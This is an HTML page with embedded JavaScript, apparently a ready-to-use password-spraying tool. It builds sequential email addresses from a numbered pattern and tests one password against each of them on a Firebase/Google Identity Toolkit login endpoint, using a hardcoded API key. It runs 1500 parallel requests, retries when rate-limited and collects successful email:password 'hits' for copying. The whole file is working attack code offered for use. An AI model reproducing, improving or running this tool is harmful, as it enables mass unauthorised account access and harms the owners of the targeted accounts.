<!DOCTYPE html>
<html>
<head>
    <title>100% Sequence Accuracy | Ultra Speed</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; text-align: center; }
        .terminal { max-width: 550px; margin: auto; border: 2px solid #0f0; background: #050505; padding: 20px; box-shadow: 0 0 30px #0f0; border-radius: 10px; }
        h1 { font-size: 18px; border-bottom: 1px solid #0f0; padding-bottom: 10px; color: #fff; text-transform: uppercase; }
        
        input { width: 100%; padding: 15px; margin: 8px 0; background: #000; border: 1px solid #0f0; color: #fff; outline: none; box-sizing: border-box; font-size: 16px; border-radius: 5px; }
        .btn-start { width: 100%; padding: 20px; background: #0f0; color: #000; border: none; font-weight: bold; font-size: 18px; cursor: pointer; border-radius: 5px; margin-bottom: 10px; }
        .btn-copy { width: 100%; padding: 12px; background: #222; color: #0f0; border: 1px solid #0f0; font-weight: bold; cursor: pointer; border-radius: 5px; }

        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
        .item { background: #0a0a0a; padding: 15px; border: 1px solid #333; border-radius: 5px; }
        .item span { font-size: 10px; color: #888; text-transform: uppercase; }
        .item b { font-size: 28px; color: #0f0; display: block; }

        #speed-tag { color: #0ff; font-weight: bold; margin-bottom: 10px; font-size: 14px; }
        #res { width: 100%; height: 350px; background: #000; color: #fff; border: 1px solid #333; padding: 10px; font-size: 13px; margin-top: 15px; resize: none; border-radius: 5px; }
    </style>
</head>
<body>

<div class="terminal">
    <h1>🚀 ACCURACY ENGINE V12</h1>
    <div id="speed-tag">STATUS: READY</div>
    
    <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
    <input type="text" id="pwd" placeholder="PASSWORD">
    
    <button class="btn-start" id="btn" onclick="ignite()">⚡ START SEQUENTIAL ATTACK</button>
    <button class="btn-copy" onclick="copyAll()">📋 COPY ALL HITS</button>

    <div class="grid">
        <div class="item"><span>Checked (Order)</span><b id="c">0</b></div>
        <div class="item"><span>Found Hits</span><b id="f">0</b></div>
    </div>

    <textarea id="res" readonly placeholder="Hits will stream here (1,2,3,4... order guaranteed)"></textarea>
</div>

<script>
    let active = false, checked = 0, found = 0, index = 0, nextToPrint = 0;
    let storage = new Map(), startTime, uiBuffer = "";
    const key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

    async function ignite() {
        if (active) { location.reload(); return; }
        let fmt = document.getElementById('fmt').value.toUpperCase().trim();
        let pwd = document.getElementById('pwd').value.trim();

        if (!fmt.includes('{') || !pwd) return alert("Details Enter ചെയ്യ് ബ്രോ!");

        active = true;
        startTime = Date.now();
        document.getElementById('btn').innerText = "🛑 EMERGENCY STOP";
        document.getElementById('btn').style.background = "#f00";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let max = Math.pow(10, digits);

        // --- EXTREME SPEED WORKERS (1500 PARALLEL) ---
        for (let i = 0; i < 1500; i++) {
            (async function work() {
                while (active && index < max) {
                    let cur = index++;
                    await check(fmt, pwd, cur, digits);
                }
            })();
        }

        // --- HIGH-SPEED UI UPDATE ---
        setInterval(() => {
            if (!active) return;
            let elapsed = (Date.now() - startTime) / 1000;
            let spd = Math.round(checked / elapsed);
            document.getElementById('speed-tag').innerText = `🔥 SPEED: ${spd} REQ/SEC | SYNCING: ${nextToPrint}`;
            document.getElementById('c').innerText = checked;
            document.getElementById('f').innerText = found;

            if (uiBuffer !== "") {
                let area = document.getElementById('res');
                area.value += uiBuffer;
                area.scrollTop = area.scrollHeight;
                uiBuffer = "";
            }
        }, 300);
    }

    async function check(fmt, pwd, idx, digits) {
        let email = fmt.replace(/\{(\d+)\}/, idx.toString().padStart(digits, '0'));
        
        try {
            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${key}`, {
                method: 'POST',
                body: JSON.stringify({ email: email, password: pwd, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            
            if (r.status === 429) {
                await new Promise(res => setTimeout(res, 2000));
                return check(fmt, pwd, idx, digits); // Retry
            }

            let d = await r.json();
            storage.set(idx, { ok: (d && d.idToken), mail: email });

            // --- THE SEQUENTIAL LOCK ---
            // 1 കഴിഞ്ഞാലേ 2 വരൂ, 2 കഴിഞ്ഞാലേ 3 വരൂ... 100% Accuracy!
            while (storage.has(nextToPrint)) {
                let data = storage.get(nextToPrint);
                if (data.ok) {
                    found++;
                    uiBuffer += data.mail + ":" + pwd + "\n";
                }
                checked++;
                storage.delete(nextToPrint); 
                nextToPrint++;
            }
        } catch (e) {
            return check(fmt, pwd, idx, digits); // Network Error - Auto Retry
        }
    }

    function copyAll() {
        let area = document.getElementById('res');
        area.select();
        document.execCommand('copy');
        alert("Found Hits Copied! 🔥");
    }
</script>
</body>
</html>
